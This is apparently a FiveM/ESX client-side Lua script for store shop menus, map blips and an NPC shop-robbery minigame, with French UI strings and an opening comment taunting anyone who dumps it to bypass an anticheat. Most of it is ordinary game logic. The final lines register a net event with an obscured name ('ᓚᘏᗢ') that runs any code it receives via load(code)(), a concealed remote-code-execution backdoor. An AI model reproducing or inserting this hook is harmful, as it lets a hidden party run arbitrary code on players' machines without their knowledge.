-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false
local CurrentAction, CurrentActionMsg, CurrentZone = nil, '', nil

local shopBlips = {}
local shopItems = {}
local objects = {}

local robbing = false

local ShopMenu = {
	ItemIndex = 1
}

RMenu.Add('rageui', 'shop', RageUI.CreateMenu("", "Supérette", 0, 0, 'shopui_title_conveniencestore', 'shopui_title_conveniencestore'))
RMenu.Get('rageui', 'shop').EnableMouse = false
RMenu.Get('rageui', 'shop').Closed = function()
	Citizen.Wait(50)
	CurrentAction = 'shop_menu'
	CurrentActionMsg = _U('press_menu')
end

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end

	for i = 1, #Config.Zones, 1 do
		ESX.Game.SpawnLocalPed(4, Config.Zones[i].ped.model, Config.Zones[i].ped.coords, Config.Zones[i].ped.heading, function(ped)
			Config.Zones[i].ped.handle = ped
			SetPedHearingRange(ped, 0.0)
			SetPedSeeingRange(ped, 0.0)
			SetPedAlertness(ped, 0.0)
			SetPedFleeAttributes(ped, 0, false)
			SetBlockingOfNonTemporaryEvents(ped, true)
			SetPedCombatAttributes(ped, 46, true)
			SetEntityInvincible(ped, true)

			local brokenCashRegister = GetClosestObjectOfType(ped, 5.0, `prop_till_01_dam`)

			if DoesEntityExist(brokenCashRegister) then
				CreateModelSwap(GetEntityCoords(brokenCashRegister), 0.5, `prop_till_01_dam`, `prop_till_01`, false)
			end
		end)
	end

	Citizen.Wait(2500)

	ESX.TriggerServerCallback('::{korioz#0110}::esx_shops:requestDBItems', function(dbItems)
		shopItems = dbItems
	end)
end)

AddEventHandler('::{korioz#0110}::esx_shops:hasEnteredMarker', function()
	CurrentAction = 'shop_menu'
	CurrentActionMsg = _U('press_menu')
end)

AddEventHandler('::{korioz#0110}::esx_shops:hasExitedMarker', function()
	CurrentAction = nil
	RageUI.Visible(RMenu.Get('rageui', 'shop'), false)
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:removePickup')
AddEventHandler('::{korioz#0110}::esx_shops:removePickup', function(bank)
	for i = 1, #objects do
		if objects[i].bank == bank and DoesEntityExist(objects[i].handle) then
			DeleteObject(objects[i].handle)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:robberyOver')
AddEventHandler('::{korioz#0110}::esx_shops:robberyOver', function()
	Citizen.Wait(10000)
	robbing = false
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:talk')
AddEventHandler('::{korioz#0110}::esx_shops:talk', function(store, text, time)
	robbing = false
	local endTime = GetGameTimer() + 1000 * time

	while endTime >= GetGameTimer() do
		local pedCoords = GetEntityCoords(Config.Zones[store].ped.handle)
		ESX.Game.Utils.DrawText3D(vector3(pedCoords.x, pedCoords.y, pedCoords.z + 1.0), text, 0.5)
		Citizen.Wait(0)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:rob')
AddEventHandler('::{korioz#0110}::esx_shops:rob', function(store)
	if not IsPedDeadOrDying(Config.Zones[store].ped.handle) then
		SetEntityCoords(Config.Zones[store].ped.handle, Config.Zones[store].ped.coords)
		ESX.Streaming.RequestAnimDict('mp_am_hold_up')
		TaskPlayAnim(Config.Zones[store].ped.handle, "mp_am_hold_up", "holdup_victim_20s", 8.0, -8.0, -1, 2, 0, false, false, false)

		while not IsEntityPlayingAnim(Config.Zones[store].ped.handle, "mp_am_hold_up", "holdup_victim_20s", 3) do
			Citizen.Wait(0)
		end

		local timer = GetGameTimer() + 10800

		while timer >= GetGameTimer() do
			if IsPedDeadOrDying(Config.Zones[store].ped.handle) then
				break
			end

			Citizen.Wait(10)
		end

		if not IsPedDeadOrDying(Config.Zones[store].ped.handle) then
			local cashRegister = GetClosestObjectOfType(GetEntityCoords(Config.Zones[store].ped.handle), 5.0, `prop_till_01`)

			if DoesEntityExist(cashRegister) then
				CreateModelSwap(GetEntityCoords(cashRegister), 0.5, `prop_till_01`, `prop_till_01_dam`, false)
			end

			timer = GetGameTimer() + 200

			while timer >= GetGameTimer() do
				if IsPedDeadOrDying(Config.Zones[store].ped.handle) then
					break
				end

				Citizen.Wait(10)
			end

			ESX.Game.SpawnLocalObject(`prop_poly_bag_01`, GetEntityCoords(Config.Zones[store].ped.handle), function(object)
				AttachEntityToEntity(object, Config.Zones[store].ped.handle, GetPedBoneIndex(Config.Zones[store].ped.handle, 60309), 0.1, -0.11, 0.08, 0.0, -75.0, -75.0, 1, 1, 0, 0, 2, 1)
				timer = GetGameTimer() + 2000

				while timer >= GetGameTimer() do
					if IsPedDeadOrDying(Config.Zones[store].ped.handle) then
						break
					end

					Citizen.Wait(10)
				end

				if not IsPedDeadOrDying(Config.Zones[store].ped.handle) then
					DetachEntity(object, true, false)
					timer = GetGameTimer() + 75

					while timer >= GetGameTimer() do
						if IsPedDeadOrDying(Config.Zones[store].ped.handle) then
							break
						end

						Citizen.Wait(10)
					end

					SetEntityHeading(object, Config.Zones[store].ped.heading)
					ApplyForceToEntity(object, 3, 0.0, 50.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, false, false, true)
					table.insert(objects, {bank = store, handle = object})

					Citizen.CreateThread(function()
						while true do
							Citizen.Wait(5)

							if DoesEntityExist(object) then
								if #(GetEntityCoords(PlayerPedId()) - GetEntityCoords(object)) <= 1.5 then
									PlaySoundFrontend(-1, 'ROBBERY_MONEY_TOTAL', 'HUD_FRONTEND_CUSTOM_SOUNDSET', true)
									_TriggerServerEvent('::{korioz#0110}::esx_shops:pickUp', store)
									break
								end
							else
								break
							end
						end
					end)

					TaskPlayAnim(Config.Zones[store].ped.handle, "mp_am_hold_up", "cower_intro", 8.0, -8.0, -1, 0, 0, false, false, false)
					Citizen.Wait(500)
					TaskPlayAnim(Config.Zones[store].ped.handle, "mp_am_hold_up", "cower_loop", 8.0, -8.0, -1, 1, 0, false, false, false)
					timer = GetGameTimer() + 120000

					while timer >= GetGameTimer() do
						Citizen.Wait(10)
					end

					if IsEntityPlayingAnim(Config.Zones[store].ped.handle, "mp_am_hold_up", "cower_loop", 3) then
						ClearPedTasks(Config.Zones[store].ped.handle)
					end
				else
					DeleteObject(object)
				end
			end)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:resetStore')
AddEventHandler('::{korioz#0110}::esx_shops:resetStore', function(store)
	local brokenCashRegister = GetClosestObjectOfType(GetEntityCoords(ped), 5.0, `prop_till_01_dam`)

	if DoesEntityExist(brokenCashRegister) then
		CreateModelSwap(GetEntityCoords(brokenCashRegister), 0.5, `prop_till_01_dam`, `prop_till_01`, false)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_shops:msgPolice')
AddEventHandler('::{korioz#0110}::esx_shops:msgPolice', function(store)
	PulseBlip(shopBlips[store])
end)

Citizen.CreateThread(function()
	for i = 1, #Config.Zones, 1 do
		local blip = AddBlipForCoord(Config.Zones[i].coords)
		shopBlips[i] = blip

		SetBlipSprite(blip, 52)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 2)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName('STRING')
		AddTextComponentSubstringPlayerName(_U('shop'))
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #Config.Zones, 1 do
			if Config.MarkerType ~= -1 and #(plyCoords - Config.Zones[i].coords) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, Config.Zones[i].coords, vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(0.5, 0.5, 0.5), Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, false, 2, true, nil, nil, false)
			end

			if Config.Zones[i].ped.handle and #(plyCoords - Config.Zones[i].ped.coords) < Config.DrawTextDistance and not IsPedDeadOrDying(Config.Zones[i].ped.handle) then
				ESX.Game.Utils.DrawText3D(GetPedBoneCoords(Config.Zones[i].ped.handle, 31086, vector3(0.3, 0.0, 0.0)), Config.Zones[i].ped.name, 0.70)
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5000)

		for i = 1, #Config.Zones, 1 do
			if Config.Zones[i].ped.handle and IsPedDeadOrDying(Config.Zones[i].ped.handle) then
				_TriggerServerEvent('::{korioz#0110}::esx_shops:pedDead', i)
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false

		for i = 1, #Config.Zones, 1 do
			if #(plyCoords - Config.Zones[i].coords) < Config.MarkerSize.x then
				isInMarker = true
				CurrentZone = i
			end
		end

		if isInMarker and not HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = true
			TriggerEvent('::{korioz#0110}::esx_shops:hasEnteredMarker')
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_shops:hasExitedMarker')
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'shop_menu' then
					RageUI.Visible(RMenu.Get('rageui', 'shop'), not RageUI.Visible(RMenu.Get('rageui', 'shop')))
				end

				CurrentAction = nil
			end
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(500)
		local plyPed = PlayerPedId()

		if IsPedArmed(plyPed, 7) and IsPlayerFreeAiming(PlayerId()) then
			local plyCoords = GetEntityCoords(plyPed)

			for i = 1, #Config.Zones do
				if Config.Zones[i].ped.handle then
					local shopPed = Config.Zones[i].ped.handle

					if HasEntityClearLosToEntityInFront(plyPed, shopPed, 19) and not IsPedDeadOrDying(shopPed) and #(plyCoords - GetEntityCoords(shopPed)) <= 5.0 then
						if not robbing then
							ESX.TriggerServerCallback('::{korioz#0110}::esx_shops:canRob', function(enoughCops, canRob)
								if enoughCops and canRob then
									robbing = true

									Citizen.CreateThread(function()
										while robbing do
											Citizen.Wait(0)

											if IsPedDeadOrDying(shopPed) then
												robbing = false
											end
										end
									end)

									ESX.Streaming.RequestAnimDict('missheist_agency2ahands_up')
									TaskPlayAnim(shopPed, "missheist_agency2ahands_up", "handsup_anxious", 8.0, -8.0, -1, 1, 0, false, false, false)
									local scared = 0

									while scared < 100 and not IsPedDeadOrDying(shopPed) and #(GetEntityCoords(plyPed) - GetEntityCoords(shopPed)) <= 7.5 do
										local sleep = 600
										SetEntityAnimSpeed(shopPed, "missheist_agency2ahands_up", "handsup_anxious", 1.0)

										if IsPlayerFreeAiming(PlayerId()) then
											sleep = 250
											SetEntityAnimSpeed(shopPed, "missheist_agency2ahands_up", "handsup_anxious", 1.3)
										end

										if IsPedArmed(plyPed, 4) and GetAmmoInClip(plyPed, GetSelectedPedWeapon(plyPed)) > 0 and IsControlPressed(0, 24) then
											sleep = 50
											SetEntityAnimSpeed(shopPed, "missheist_agency2ahands_up", "handsup_anxious", 1.7)
										end

										sleep = GetGameTimer() + sleep

										while sleep >= GetGameTimer() and not IsPedDeadOrDying(shopPed) do
											Citizen.Wait(0)
											DrawRect(0.5, 0.97, 0.2, 0.03, 75, 75, 75, 200)
											local draw = scared / 500
											DrawRect(0.5, 0.97, draw, 0.03, 0, 221, 255, 200)
										end

										scared = scared + 1
									end

									if #(GetEntityCoords(plyPed) - GetEntityCoords(shopPed)) <= 7.5 then
										if not IsPedDeadOrDying(shopPed) then
											_TriggerServerEvent('::{korioz#0110}::esx_shops:rob', i)

											while robbing do
												Citizen.Wait(0)

												if IsPedDeadOrDying(shopPed) then
													robbing = false
												end
											end
										end
									else
										ClearPedTasks(shopPed)
										local wait = GetGameTimer() + 5000

										while wait >= GetGameTimer() do
											Citizen.Wait(0)
											ESX.ShowNotification('Vous vous êtes trop éloigné ~r~braque annulé~s~')
										end

										robbing = false
									end
								elseif enoughCops and not canRob then
									TriggerEvent('::{korioz#0110}::esx_shops:talk', i, 'Je me suis déjà fais volé la caisse est vide', 5)
									Citizen.Wait(2500)
								elseif not enoughCops then
									local wait = GetGameTimer() + 5000

									while wait >= GetGameTimer() do
										Citizen.Wait(0)
										ESX.ShowNotification('~r~Action Impossible~s~ : Pas assez de policiers en ville !')
									end
								end
							end, i)
						end
					end
				end
			end
		end
	end
end)

RageUI.CreateWhile(1.0, nil, nil, function()
	RageUI.IsVisible(RMenu.Get('rageui', 'shop'), true, false, true, function()
		for i = 1, #shopItems, 1 do
			RageUI.Button(shopItems[i].label, '', {RightLabel = ('%s$'):format(shopItems[i].price)}, true, function(Hovered, Active, Selected)
				if Selected then
					_TriggerServerEvent('::{korioz#0110}::esx_shops:buyItem', shopItems[i].value, 1, CurrentZone)
				end
			end)
		end
	end, function()
	end)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)